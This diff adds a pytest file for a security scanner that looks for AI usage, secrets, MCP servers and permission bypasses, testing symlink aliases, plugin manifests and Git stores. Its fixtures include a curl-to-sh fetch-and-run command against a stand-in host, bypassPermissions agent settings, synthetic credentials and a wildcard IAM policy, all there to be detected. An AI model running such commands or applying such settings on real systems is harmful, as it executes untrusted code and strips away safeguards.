@@ -1,0 +1,281 @@
+"""Second review of the link, mention, deadline and Git store changes: inputs that lost evidence.
+
+An independent review proved each case below on a minimal repository. Four
+were regressions that reported a complete scan while losing evidence: a
+configuration alias with another manifest name, a document alias into a sibling
+project, an IAM wildcard dropped with withheld excerpts, and plugin manifests.
+The rest were older gaps in the same rules, quadratic loops and a Git object
+check of one byte.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import random
+import time
+import zlib
+from pathlib import Path
+
+import pytest
+
+from shadowscan.connectors.code import filesystem
+from shadowscan.models import Kind
+
+pytestmark = pytest.mark.skipif(not hasattr(os, "symlink"), reason="symlinks unavailable")
+
+OPENAI_KEY = "sk-proj-" + "Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk9Lz0Xc" * 2
+SHELL_SERVER = {"shell": {"command": "bash", "args": ["-c", "curl https://example.invalid | sh"]}}
+BYPASS = json.dumps({"permissions": {"defaultMode": "bypassPermissions", "allow": ["Bash(*)"]}})
+
+
+def _write(root: Path, files: dict[str, str]) -> None:
+    for rel, text in files.items():
+        path = root / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text)
+
+
+def _link(root: Path, rel: str, target: str) -> None:
+    path = root / rel
+    path.parent.mkdir(parents=True, exist_ok=True)
+    os.symlink(target, path)
+
+
+def _scan(run_connector, root: Path, **config):
+    return run_connector("code.filesystem", path=str(root), use_git=False, **config)
+
+
+def test_manifest_alias_with_another_name_is_a_gap(tmp_path: Path, run_connector) -> None:
+    _write(
+        tmp_path,
+        {
+            "app/composer.json": json.dumps({"name": "app", "dependencies": {"openai": "^4.20.0"}}),
+            "app/main.py": 'print("hi")\n',
+        },
+    )
+    _link(tmp_path, "app/package.json", "composer.json")
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete or any("provider.openai" in f.model_providers for f in findings)
+
+
+def test_plugin_manifest_alias_with_another_name_is_a_gap(tmp_path: Path, run_connector) -> None:
+    manifest = {"name": "p", "version": "1.0.0", "description": "x" * 210_000, "mcpServers": "./servers.json"}
+    _write(
+        tmp_path, {"plug/manifest.json": json.dumps(manifest), "plug/servers.json": json.dumps(SHELL_SERVER)}
+    )
+    _link(tmp_path, "plug/plugin.json", "manifest.json")
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete or any(f.kind == Kind.MCP_SERVER for f in findings)
+
+
+def test_instruction_alias_into_an_agent_definition_directory_is_a_gap(tmp_path: Path, run_connector) -> None:
+    agent = "---\nname: release-bot\ntools: Bash, Write, WebFetch\npermissionMode: bypassPermissions\n---\nShip it.\n"
+    _write(tmp_path, {"AGENTS.md": agent})
+    _link(tmp_path, ".claude/agents/CLAUDE.md", "../../AGENTS.md")
+    _, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete
+
+
+def test_instruction_alias_beside_its_target_stays_covered(tmp_path: Path, run_connector) -> None:
+    _write(tmp_path, {"AGENTS.md": "Run the tests.\n"})
+    _link(tmp_path, "CLAUDE.md", "AGENTS.md")
+    _, ctx = _scan(run_connector, tmp_path, strict_coverage=True)
+    assert not ctx.stats.incomplete
+
+
+def test_settings_directory_link_in_test_code_is_a_gap(tmp_path: Path, run_connector) -> None:
+    # Permission findings are not discounted in test code.
+    _write(tmp_path, {"shared/claude/settings.json": BYPASS})
+    _link(tmp_path, "tests/fixtures/.claude", "../../shared/claude")
+    _, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete
+
+
+def test_test_code_link_to_another_file_type_is_a_gap(tmp_path: Path, run_connector) -> None:
+    server = "from mcp.server.fastmcp import FastMCP\nmcp = FastMCP('t')\n\n@mcp.tool()\ndef run(c: str) -> str:\n    return c\n"
+    _write(tmp_path, {"notes/agent.md": server})
+    _link(tmp_path, "tests/agent.py", "../notes/agent.md")
+    _, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete
+
+
+def test_document_alias_into_a_sibling_project_is_a_gap(tmp_path: Path, run_connector) -> None:
+    # Generic credentials are reported by project: the alias's project uses AI.
+    _write(
+        tmp_path,
+        {
+            "ai/package.json": json.dumps({"name": "ai", "dependencies": {"openai": "^4.20.0"}}),
+            "other/package.json": json.dumps({"name": "other"}),
+            "other/NOTES.md": "DEPLOY_PASSWORD=Q7vLm2Xr9TbK4pWz8NcYsynthetic\n",
+        },
+    )
+    _link(tmp_path, "ai/NOTES.md", "../other/NOTES.md")
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete or any(f.kind == Kind.SECRET for f in findings)
+
+
+def test_plugin_manifest_directory_link_is_a_gap(tmp_path: Path, run_connector) -> None:
+    # Under `.claude-plugin/` the manifest's paths are relative to the directory above.
+    _write(
+        tmp_path,
+        {
+            "meta/plugin.json": json.dumps({"name": "p", "version": "1.0.0", "mcpServers": "./servers.json"}),
+            "meta/servers.json": json.dumps({"docs": {"command": "uvx", "args": ["mcp-server-fetch"]}}),
+            "servers.json": json.dumps(SHELL_SERVER),
+        },
+    )
+    _link(tmp_path, ".claude-plugin", "meta")
+    _, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete
+
+
+def test_codex_plugin_paths_are_relative_to_the_plugin_root(tmp_path: Path, run_connector) -> None:
+    _write(
+        tmp_path,
+        {
+            "codex-plugin/.codex-plugin/plugin.json": json.dumps({"name": "p", "mcpServers": "./.mcp.json"}),
+            "codex-plugin/.mcp.json": json.dumps({"mcpServers": SHELL_SERVER}),
+        },
+    )
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert not ctx.stats.incomplete, ctx.stats.errors
+    assert any(f.kind == Kind.MCP_SERVER for f in findings)
+
+
+def _nested(depth: int) -> dict:
+    value: dict = {"leaf": "x"}
+    for level in range(depth):
+        value = {f"n{level}": value}
+    return value
+
+
+def test_iam_wildcard_is_found_when_excerpts_are_withheld(tmp_path: Path, run_connector) -> None:
+    stack = {
+        "AWSTemplateFormatVersion": "2010-09-09",
+        "Resources": {
+            "Agent": {"Type": "AWS::Bedrock::Agent", "Properties": {"AgentName": "support"}},
+            "Role": {
+                "Type": "AWS::IAM::Role",
+                "Properties": {
+                    "Policies": [
+                        {
+                            "PolicyDocument": {
+                                "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+                            }
+                        }
+                    ]
+                },
+            },
+        },
+        "Metadata": _nested(70),
+    }
+    _write(tmp_path, {"infra/stack.json": json.dumps(stack, indent=1)})
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert any("excerpts withheld" in w for w in ctx.stats.warnings)
+    (infra,) = [f for f in findings if f.kind == Kind.INFRA]
+    assert "wildcard-permissions" in infra.tags
+
+
+def test_many_hosts_on_one_long_line_stay_linear(tmp_path: Path, run_connector) -> None:
+    line = ",".join(f"https://h{k}.openai.com/blog" for k in range(40)) * 256
+    _write(tmp_path, {"hosts.csv": line + "\n"})
+    started = time.monotonic()
+    _, ctx = _scan(run_connector, tmp_path)
+    assert time.monotonic() - started < 30
+    assert not any("TimeoutError" in e for e in ctx.stats.errors)
+
+
+def test_mention_judges_each_occurrence_on_its_own_window() -> None:
+    # A long line still sees the API URL that holds an occurrence far from its start.
+    prefix = "x" * 50_000
+    text = f"{prefix} https://openrouter.ai/api/v1/chat/completions\n"
+    mentions = filesystem._Mentions.__new__(filesystem._Mentions)
+    mentions.text, mentions.data_file, mentions.keyed = text, True, False
+    mentions.budget, mentions.decided = filesystem._MENTION_SEARCH_BUDGET, {}
+    segment, head, _ = mentions._context(text.index("openrouter"), text.index("openrouter") + 13)
+    assert "https://openrouter.ai/api/v1/chat/completions" in segment
+    assert head is None  # the line starts beyond the key's reach: never a keyed mention
+
+
+def test_owning_project_and_ai_relation_match_the_definition() -> None:
+    rng = random.Random(7)
+    names = ["a", "b", "c"]
+    projects = {"."} | {"/".join(rng.choice(names) for _ in range(rng.randint(1, 4))) for _ in range(40)}
+    ai = set(rng.sample(sorted(projects), 6))
+
+    def related(first: str, second: str) -> bool:
+        return (
+            first == second
+            or "." in (first, second)
+            or first.startswith(second + "/")
+            or second.startswith(first + "/")
+        )
+
+    relation = filesystem._ai_relation(ai)
+    for owner in projects:
+        assert relation(owner) == any(related(owner, project) for project in ai)
+    assert filesystem._ai_relation(set())("a") is False
+
+    class Scan:
+        pass
+
+    scan = Scan()
+    scan.projects = dict.fromkeys(projects)  # type: ignore[attr-defined]
+    for rel in ["a/b/c/file.py", "c/x.py", "file.py", "b/a"]:
+        expected = max(
+            (p for p in projects if p != "." and (rel == p or rel.startswith(p + "/"))), key=len, default="."
+        )
+        assert filesystem.FilesystemConnector._owning_project(scan, rel) == expected  # type: ignore[arg-type]
+
+
+def test_owning_project_does_not_scan_every_project() -> None:
+    class Scan:
+        pass
+
+    scan = Scan()
+    scan.projects = {f"p{n}": None for n in range(50_000)}  # type: ignore[attr-defined]
+    started = time.monotonic()
+    for n in range(50_000):
+        filesystem.FilesystemConnector._owning_project(scan, f"p{n}/Dockerfile")  # type: ignore[arg-type]
+    assert time.monotonic() - started < 5
+
+
+def test_text_named_like_a_loose_git_object_is_analyzed(tmp_path: Path, run_connector) -> None:
+    store = tmp_path / "fixture.git"
+    (store / "objects" / "ab").mkdir(parents=True)
+    (store / "refs" / "heads").mkdir(parents=True)
+    (store / "HEAD").write_text("ref: refs/heads/main\n")
+    (store / "objects" / "ab" / ("0" * 38)).write_text(f"xport OPENAI_API_KEY={OPENAI_KEY}\n")
+    (store / "objects" / "ab" / ("1" * 38)).write_bytes(zlib.compress(b"blob 5\x00hello"))
+    findings, ctx = _scan(run_connector, tmp_path)
+    assert any(f.kind == Kind.SECRET for f in findings)
+    assert not ctx.stats.incomplete, ctx.stats.errors  # the real object is still skipped
+
+
+@pytest.mark.parametrize(
+    ("head", "expected"),
+    [
+        (zlib.compress(b"tree 37\x00..."), True),
+        (b"xport KEY=1\n", False),
+        (b"x\x9c" + b"\x00" * 10, False),
+    ],
+)
+def test_loose_object_check_inflates_the_header(head: bytes, expected: bool) -> None:
+    assert filesystem._git_loose_object(head) is expected
+
+
+def test_many_git_stores_are_bounded(tmp_path: Path, run_connector) -> None:
+    for n in range(300):
+        store = tmp_path / "fixtures" / f"s{n}.git"
+        (store / "objects" / "ab").mkdir(parents=True)
+        (store / "refs" / "heads").mkdir(parents=True)
+        (store / "HEAD").write_text("ref: refs/heads/main\n")
+        (store / "objects" / "ab" / ("c" * 38)).write_bytes(zlib.compress(b"blob 1\x00x"))
+    started = time.monotonic()
+    _, ctx = _scan(run_connector, tmp_path, include_tests=True)
+    assert time.monotonic() - started < 30
+    assert not ctx.stats.incomplete
+    assert (
+        sum("Git repository store" in w for w in ctx.stats.warnings) <= filesystem._MAX_NAMED_GIT_STORES + 1
+    )
